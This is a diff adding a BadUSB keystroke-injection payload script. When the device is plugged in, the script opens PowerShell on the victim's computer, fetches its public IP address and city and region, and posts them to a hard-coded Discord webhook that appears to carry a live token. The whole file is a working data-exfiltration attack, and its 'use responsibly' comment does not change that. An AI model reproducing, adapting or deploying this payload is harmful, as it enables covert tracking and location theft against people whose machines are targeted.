@@ -1,0 +1,26 @@
+REM Written and tested by Dante Sparda
+REM This script sends the IP address and geolocation of the machine to a Discord webhook.
+REM Please use responsibly.
+
+DELAY 1000
+GUI R
+DELAY 1000
+STRING powershell.exe
+ENTER
+DELAY 3000
+
+REM Get public IP address
+STRING $ip = (Invoke-RestMethod -Uri "http://ifconfig.me"); 
+DELAY 500
+
+REM Get location details based on IP address
+STRING $location = (Invoke-RestMethod -Uri "http://ipinfo.io/$ip/json"); 
+DELAY 500
+
+REM Extract city and region from location data
+STRING $city = $location.city; $region = $location.region; 
+
+REM Send IP and location to Discord webhook
+STRING Invoke-RestMethod -Uri 'https://discordapp.com/api/webhooks/1287930563402924112/7i_MKNW3xnJc-hWpfS8dLSILaSS-2Cs6Vf0SOT9KQyA2pWcwXrcAnL3IiVP8tnhDCqQ6' -Method Post -ContentType 'application/json' -Body (@{content="IP Address: $ip`nLocation: $city, $region"} | ConvertTo-Json)
+ENTER
+END
